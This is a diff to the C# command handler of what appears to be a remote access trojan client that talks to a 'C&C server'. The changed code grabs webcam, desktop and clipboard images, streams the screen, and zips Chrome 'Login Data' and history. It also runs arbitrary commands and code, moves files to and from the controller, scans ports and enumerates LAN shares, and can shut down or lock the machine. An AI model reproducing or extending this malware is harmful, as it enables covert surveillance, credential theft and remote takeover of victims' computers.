@@ -12,6 +12,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Reflection;
+using System.Speech.Synthesis;
 using System.Text;
 using System.Windows.Forms;
 
@@ -254,49 +255,54 @@ namespace ClientHandler
             {
                 // handle
             }
+            StartWork(true);
         }
 
         public void UploadWebcamImage()
         {
+            StartWork(true);
             long quality = 95;
             long.TryParse(Transmitter.TSettings.Parameters, out quality);
-            var bitmapImage = WebcamControl.GetWebCamImage();
-            StartWork(true);
-            Transmitter.UploadImage("webcam.jpg", bitmapImage, quality);
+            var data = Imaging.BitmapToJpeg(WebcamControl.GetWebCamImage(), quality);
+            UploadResult(data, "webcam.jpg", false, false, false);
         }
 
         public void UploadClipboardData()
         {
-
-            long quality = 80;
-            long.TryParse(Transmitter.TSettings.Parameters, out quality);
-            // Upload clipboard text
-            var clipboardText = Clipboard.GetText();
-            if (!string.IsNullOrEmpty(clipboardText))
+            if (Clipboard.ContainsText())
             {
-                Transmitter.UploadData("clipboard.txt", clipboardText, false);
+                StartWork(true);
+                UploadResult(Clipboard.GetText(), "clipboard.txt");
             }
-            // Upload clipboard image
-            StartWork(true);
-            Transmitter.UploadImage("clipboard.jpg", Clipboard.GetImage(), quality);
+            if (Clipboard.ContainsImage())
+            {
+                StartWork(true);
+                long quality = 80;
+                long.TryParse(Transmitter.TSettings.Parameters, out quality);
+                var data = Imaging.BitmapToJpeg(Clipboard.GetImage(), quality);
+                UploadResult(data, "clipboard.jpg", false, false, false);
+            }
         }
 
         public void UploadDesktopImage()
         {
+            StartWork(true);
             long quality = 80;
             long.TryParse(Transmitter.TSettings.Parameters, out quality);
-            var bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-            //if (bitmapImage != null)
-            //{
-            //    result = new UploadResult()
-            //    {
-            //        FileName = "desktop.jpg",
-            //        FileSize = bitmapImage.ImageToByte().Length
-            //    };
-            //    Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
-            //}
-            StartWork(true);
-            Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
+            var data = Imaging.BitmapToJpeg(ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb), quality);
+            UploadResult(data, "desktop.jpg", false, false, false);
+        }
+
+        string GetParsFormatted()
+        {
+            var inputSplit = Transmitter.TSettings.Parameters.Split(' ');
+            var parsFormatted = "";
+            for (int i = 0; i < inputSplit.Length; i++)
+            {
+                parsFormatted += inputSplit[i] + " ";
+            }
+            parsFormatted = parsFormatted.TrimEnd();
+            return parsFormatted;
         }
 
         public void ExecuteCommand()
@@ -306,12 +312,12 @@ namespace ClientHandler
             {
                 var inputSplit = Transmitter.TSettings.Parameters.Split(' ');
                 var fileName = inputSplit.Length > 0 ? inputSplit[0] : null;
-                var fileArgs = "";
-                for (int i = 1; i < inputSplit.Length; i++)
-                {
-                    fileArgs += inputSplit[i] + " ";
-                }
-                fileArgs = fileArgs.TrimEnd();
+                var fileArgs = GetParsFormatted();// "";
+                //for (int i = 1; i < inputSplit.Length; i++)
+                //{
+                //    fileArgs += inputSplit[i] + " ";
+                //}
+                //fileArgs = fileArgs.TrimEnd();
                 if (!string.IsNullOrEmpty(fileName))
                 {
                     var hasExecuted = false;
@@ -332,7 +338,7 @@ namespace ClientHandler
                 }
             }
             StartWork(true);
-            Transmitter.UploadData("result.txt", dataToUpload, false);
+            UploadResult(dataToUpload, "result.txt");
         }
 
         private int RunProcess(string fileName, string fileArgs, string workingDir, out string result)
@@ -442,7 +448,6 @@ namespace ClientHandler
             //var compHash = Transmitter.GetComputerHash();
             //Clipboard.SetText(compHash); MessageBox.Show(compHash);
             //Transmitter.Authorize();
-            //UploadImage();
             //UploadBrowserData();
             SetupConnectionTimer();
             //File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History", historyFile);
@@ -492,7 +497,8 @@ namespace ClientHandler
 
         public void SetTransmissionInterval()
         {
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
             var timeMS = Transmitter.TSettings.Parameters;
             int newInterval = 5000;
             if (int.TryParse(timeMS, out newInterval))
@@ -605,7 +611,7 @@ namespace ClientHandler
 
         }
 
-        public void StartWork(bool isDone = false, bool canUploadResult = true)
+        public void StartWork(bool isDone = false)
         {
             if (Worker != null)
             {
@@ -615,10 +621,6 @@ namespace ClientHandler
                 {
                     Worker.Stop();
                 }
-                if (canUploadResult)
-                {
-                    UploadResult(Worker.Result);
-                }
             }
         }
 
@@ -627,10 +629,10 @@ namespace ClientHandler
             if (Worker != null)
             {
                 TransmitterStatus = TransmitterStatus.IDLE;
-                if (canUploadResult)
-                {
-                    UploadResult(Worker.Result);
-                }
+                //if (canUploadResult)
+                //{
+                //    UploadResult(Worker.Result);
+                //}
                 Worker.Stop();
                 Transmitter.SetHasExectuted(Transmitter.TSettings);
             }
@@ -641,9 +643,8 @@ namespace ClientHandler
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetPortInfo();
             piList.ForEach((PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
-            var data = sb.ToString();
             StartWork(true);
-            Transmitter.UploadData("result.txt", data, false);
+            UploadResult(sb.ToString(), "ports.txt");
         }
 
         public void UploadProcessInfo()
@@ -654,7 +655,7 @@ namespace ClientHandler
                 sb.AppendLine("Name: " + p.Name + ", PID: " + p.PID);
             }
             StartWork(true);
-            Transmitter.UploadData("result.txt", sb.ToString(), false);
+            UploadResult(sb.ToString(), "processes.txt");
         }
 
         public void StopStreamDesktop()
@@ -697,9 +698,8 @@ namespace ClientHandler
             streamDesktopTimer.Interval = interval;
             streamDesktopTimer.Tick += (o, e) =>
             {
-                Bitmap bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-                UploadResult(Worker.Result);
-                Transmitter.UploadImage("stream.jpg", bitmapImage, quality);
+                var data = Imaging.BitmapToJpeg(ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb), quality);
+                UploadResult(data, "stream.jpg", false, false, false);
                 //CursorInteract();
             };
             streamDesktopTimer.Enabled = true;
@@ -721,46 +721,49 @@ namespace ClientHandler
 
         public void UploadFileEvents()
         {
+            StartWork(true);
             StringBuilder sb = new StringBuilder();
             FileDirInfo.FileDirInfoList.ForEach((FileDirInfo fdi) => sb.AppendLine(fdi.DateTime.ToString() + " " + fdi.FileInfo.ToString()));
-            Transmitter.UploadData("fileevents.txt", sb.ToString(), false);
+            UploadResult(sb.ToString(), "fileevents.txt");
         }
 
         public void DownloadFile()
         {
-            byte[] fileData = Transmitter.DownloadFile();
-            if (fileData != null)
+            StartWork(true);
+            var path = String.Empty;
+            byte[] data = Transmitter.DownloadFile();
+            var filename = Transmitter.TSettings.Parameters;
+            if (!string.IsNullOrEmpty(filename) && data != null)
             {
-                File.WriteAllBytes(Path.Combine(DirTransfers, Transmitter.TSettings.File), fileData);
-                //string path = appDir + "\\Transfers";
-                //if (!Directory.Exists(path))
-                //{
-                //    try
-                //    {
-                //        Directory.CreateDirectory(path);
-                //    }
-                //    catch { }
-                //}
-                //try
-                //{
-                //    File.WriteAllBytes(Path.Combine(path, Transmitter.TSettings.File), fileData);
-                //}
-                //catch { }
+                try
+                {
+                    path = Path.Combine(DirTransfers, filename);
+                    if (data != null)
+                    {
+                        File.WriteAllBytes(path, data);
+                    }
+                }
+                catch { }
             }
+            UploadResult(data, path, false, false, false);
         }
 
         public void UploadFile()
         {
-            var fileInfo = new FileInfo(Transmitter.TSettings.File); // .FileToDownload);
-            try
+            StartWork(true);
+            byte[] fileData = null;
+            var fileName = String.Empty;
+            var fileInfo = new FileInfo(Transmitter.TSettings.Parameters);
+            if (fileInfo != null && fileInfo.Exists)
             {
-                var data = new FileData(fileInfo, File.ReadAllBytes(fileInfo.FullName), Transmitter.TSettings.ComputerHash);
-                Transmitter.UploadData(fileInfo.Name, data, false);
+                try
+                {
+                    fileName = fileInfo.Name;
+                    fileData = File.ReadAllBytes(fileInfo.FullName);
+                }
+                catch { }
             }
-            catch (Exception ex)
-            {
-                // handle
-            }
+            UploadResult(fileData, fileName, false, false, false);
         }
 
         //private void UploadFile(string path, int c = 0)
@@ -807,6 +810,7 @@ namespace ClientHandler
 
         public void UploadBrowserData()
         {
+            StartWork(true);
             try
             {
                 // Save Chrome Browser data
@@ -815,53 +819,12 @@ namespace ClientHandler
                         "Login Data"
                     };
                 var chromePath = @"\Google\Chrome\User Data\Default\";
-                int c = 0;
                 string[] zipFiles = new string[chromeFiles.Length];
-                foreach (var file in chromeFiles)
+                for (int i = 0; i < chromeFiles.Length; i++)
                 {
-                    //var destFileName = dirTransfers + @"\Chrome " + file;
-                    //if (File.Exists(destFileName))
-                    //{
-                    //    File.Delete(destFileName);
-                    //}
-                    var sourceFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + file;
-                    //File.Copy(sourceFileName, destFileName);
-                    //zipFiles[c] = destFileName;
-                    zipFiles[c] = sourceFileName;
-                    c++;
+                    zipFiles[i] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + chromeFiles[i];
                 }
-                //var fileData = Compression.Compress(zipFiles);
-                //File.WriteAllBytes(@"C:\Users\benjamin\AeroFS\Visual Studio 2012\Projects\restless-honey-seeker\serverDotNet\Server\DataFromClient\" + DateTime.Now.Ticks + ".zip", fileData);
-
-                //var data = new FileData("ChromeData.zip", Compression.Compress(zipFiles), Transmitter.TSettings.ComputerHash);
-                Transmitter.UploadData("ChromeData.zip", zipFiles, true);
-
-
-                //if (Compression.Zip(zipFiles, dirTransfers + "\\Chrome Browser Data.zip"))
-                //{
-                //    foreach (var file in chromeFiles)
-                //    {
-                //        try
-                //        {
-                //            File.Delete(dirTransfers + @"\Chrome " + file);
-                //        }
-                //        catch (Exception ex) { }
-                //    }
-                //    string fileToUpload = dirTransfers + "\\Chrome Browser Data.zip";
-                //    //Transmitter.UploadFile("Chrome Browser Data", fileToUpload);
-                //    var fileInfo = new FileInfo(fileToUpload);
-                //    var fileData = File.ReadAllBytes(fileInfo.FullName);
-                //    Transmitter.UploadFile(new FileData()
-                //    {
-                //        FileInfo = fileInfo,
-                //        Data = fileData
-                //    });
-                //    try
-                //    {
-                //        File.Delete(fileToUpload);
-                //    }
-                //    catch (Exception ex) { }
-                //}
+                UploadResult(Compression.Compress(zipFiles), "ChromeData.zip", false, false, false);
             }
             catch (Exception ex) { }
         }
@@ -950,7 +913,8 @@ namespace ClientHandler
         public void ExecuteCode()
         {
             ExecuteCodePvt();
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
         }
 
         void ExecuteCodePvt()
@@ -1005,19 +969,34 @@ namespace ClientHandler
             }
         }
 
-        public void UploadResult(UploadResult result)
+        void UploadResult(object data = null, string outputFile = null, bool useCompression = false, bool isTextFile = true, bool canDisplayFileContents = true)
         {
-            Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(result), false);
+            Transmitter.TSettings.OutputFile = outputFile;
+            Transmitter.TSettings.CanDisplayFileContents = canDisplayFileContents;
+            //Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(Worker.Result), useCompression);
+            if (data != null && !string.IsNullOrEmpty(outputFile))
+            {
+                Transmitter.UploadData(outputFile, data, useCompression, isTextFile);
+            }
         }
+
+        //void UploadImage(Image image = null, string outputFile = null, long quality = 80L)
+        //{
+        //    Transmitter.TSettings.OutputFile = outputFile;
+        //    //Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(Worker.Result), useCompression);
+        //    if (image != null && !string.IsNullOrEmpty(outputFile))
+        //    {
+        //        Transmitter.UploadImage(outputFile, image, quality);
+        //    }
+        //}
 
         public void UploadShares()
         {
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetShareInfo();
             piList.ForEach((Library.ShareInfo si) => sb.AppendLine("Name: " + si.Name + ", Remark: " + si.Remark + ", Type: " + si.Type));
-            var data = sb.ToString();
             StartWork(true);
-            Transmitter.UploadData("shares.txt", data, false);
+            UploadResult(sb.ToString(), "shares.txt");
         }
 
         public void UploadLANComputers()
@@ -1025,9 +1004,8 @@ namespace ClientHandler
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetLANComputers();
             piList.ForEach((Library.LANComputerInfo lci) => sb.AppendLine("Name: " + lci.Name));
-            var data = sb.ToString();
             StartWork(true);
-            Transmitter.UploadData("lan_computers.txt", data, false);
+            UploadResult(sb.ToString(), "lancomputers.txt");
         }
 
         public void UploadGatewayInfo()
@@ -1035,9 +1013,8 @@ namespace ClientHandler
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetGetwayInfo();
             piList.ForEach((Library.GatewayInfo i) => sb.AppendLine("Adapter description: " + i.AdapterDescription + ", Address: " + i.Address));
-            var data = sb.ToString();
             StartWork(true);
-            Transmitter.UploadData("gateways.txt", data, false);
+            UploadResult(sb.ToString(), "gateways.txt");
         }
 
         public void UploadPortscan()
@@ -1064,8 +1041,7 @@ namespace ClientHandler
                     sbPorts.AppendLine("Portscan finished!");
                     var data = sbPorts.ToString();
                     Worker.IsDone = true;
-                    UploadResult(Worker.Result);
-                    Transmitter.UploadData("portscan.txt", data, false);
+                    UploadResult(data, "portscan.txt");
                     //txtStatus.Text = "Port scan " + Math.Round(ps.PercentageDone, 0) + "%. Found: " + ps.FoundPorts.Count;
                 }
             };
@@ -1080,37 +1056,43 @@ namespace ClientHandler
         public void Shutdown()
         {
             SystemPowerUtils.Shutdown();
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
         }
 
         public void Restart()
         {
             SystemPowerUtils.Restart();
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
         }
 
         public void Logoff()
         {
             SystemPowerUtils.Logoff();
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
         }
 
         public void LockComputer()
         {
             SystemPowerUtils.LockComputer();
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
         }
 
         public void Hibernate()
         {
             SystemPowerUtils.Hibernate();
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
         }
 
         public void Sleep()
         {
             SystemPowerUtils.Sleep();
-            StartWork(true, false);
+            StartWork(true);
+            UploadResult();
         }
 
         public void ExecutePlugin()
@@ -1122,7 +1104,7 @@ namespace ClientHandler
                 if (data != null && data.Length > 0)
                 {
                     File.WriteAllBytes(Path.Combine(AppDir, "data.dat"), data);
-                    Transmitter.UploadData("data.dat", data, false);
+                    UploadResult(data, "data.dat");
                 }
             }
         }
@@ -1159,97 +1141,110 @@ namespace ClientHandler
             }
         }
 
+        private void Speak()
+        {
+            StartWork(true);
+            SpeechSynthesizer synthesizer = new SpeechSynthesizer();
+            synthesizer.SelectVoiceByHints(VoiceGender.Female, VoiceAge.Adult);
+            synthesizer.Volume = 100;  // 0...100
+            synthesizer.Rate = -2;     // -10...10
+            synthesizer.SpeakAsync(GetParsFormatted());
+        }
+
         public void ExecuteCommand(ECommand command)
         {
             switch (command)
             {
-                case ECommand.SYSCMD_SHUTDOWN:
+                case ECommand.Speak:
+                    Speak();
+                    break;
+                case ECommand.SysShutdown:
                     Shutdown();
                     break;
-                case ECommand.SYSCMD_RESTART:
+                case ECommand.SysRestart:
                     Restart();
                     break;
-                case ECommand.SYSCMD_LOGOFF:
+                case ECommand.SysLogoff:
                     Logoff();
                     break;
-                case ECommand.SYSCMD_LOCKCOMPUTER:
+                case ECommand.SysLock:
                     LockComputer();
                     break;
-                case ECommand.SYSCMD_HIBERNATE:
+                case ECommand.SysHibernate:
                     LockComputer();
                     break;
-                case ECommand.SYSCMD_SLEEP:
+                case ECommand.SysSleep:
                     LockComputer();
                     break;
-                case ECommand.UPLOAD_PORTSCAN:
+                case ECommand.Portscan:
                     UploadPortscan();
                     break;
-                case ECommand.UPLOAD_GATEWAYS:
+                case ECommand.GetGateways:
                     UploadGatewayInfo();
                     break;
-                case ECommand.UPLOAD_LAN_COMPUTERS:
+                case ECommand.GetLanComputers:
                     UploadLANComputers();
                     break;
-                case ECommand.UPLOAD_SHARES:
+                case ECommand.GetShares:
                     UploadShares();
                     break;
-                case ECommand.SET_TRANSMISSION_INTERVAL:
+                case ECommand.SetTransmissionInterval:
                     SetTransmissionInterval();
                     break;
-                case ECommand.UPLOAD_IMAGE:
+                case ECommand.GetDesktop:
                     UploadDesktopImage();
                     break;
-                case ECommand.EXECUTE_COMMAND:
+                case ECommand.RunCommand:
                     ExecuteCommand();
                     break;
-                case ECommand.UPLOAD_CLIPBOARD_DATA:
+                case ECommand.GetClipboardData:
                     UploadClipboardData();
                     break;
-                case ECommand.UPLOAD_WEBCAM_IMAGE:
+                case ECommand.GetWebcam:
                     UploadWebcamImage();
                     break;
-                case ECommand.UPLOAD_PORT_INFO:
+                case ECommand.GetPorts:
                     UploadPortInfo();
                     break;
-                case ECommand.UPLOAD_PROCESS_INFO:
+                case ECommand.GetProcesses:
                     UploadProcessInfo();
                     break;
-                case ECommand.UPLOAD_BROWSER_DATA:
+                case ECommand.GetChromeData:
                     UploadBrowserData();
                     break;
-                case ECommand.UPLOAD_FILE_EVENTS:
+                case ECommand.GetFileEvents:
                     UploadFileEvents();
                     break;
-                case ECommand.DOWNLOAD_FILE:
+                case ECommand.UploadFile:
                     // File retreived from C&C server
                     DownloadFile();
                     break;
-                case ECommand.UPLOAD_FILE:
+                case ECommand.GetFile:
                     // File transmitted to C&C server
                     UploadFile();
                     break;
-                case ECommand.STREAM_DESKTOP:
+                case ECommand.StreamDesktop:
                     StreamDesktop();
                     break;
-                case ECommand.STOP_STREAM_DESKTOP:
+                case ECommand.StopStreamDesktop:
                     StopStreamDesktop();
                     break;
                 //case ECommand.MOVE_CURSOR:
                 //    CursorInteract();
                 //    break;
-                case ECommand.KILL_PROCESS:
+                case ECommand.KillProcess:
                     KillProcess();
                     break;
-                case ECommand.EXECUTE_PLUGIN:
+                case ECommand.StartPlugin:
                     ExecutePlugin();
                     break;
-                case ECommand.KILL_PLUGIN:
+                case ECommand.KillPlugin:
                     RemovePlugin();
                     break;
-                case ECommand.UPLOAD_PLUGIN:
+                case ECommand.UploadPlugin:
                     UploadPlugin();
                     break;
-                case ECommand.EXECUTE_CODE:
+                case ECommand.RunCode:
                     ExecuteCode();
                     break;
             }
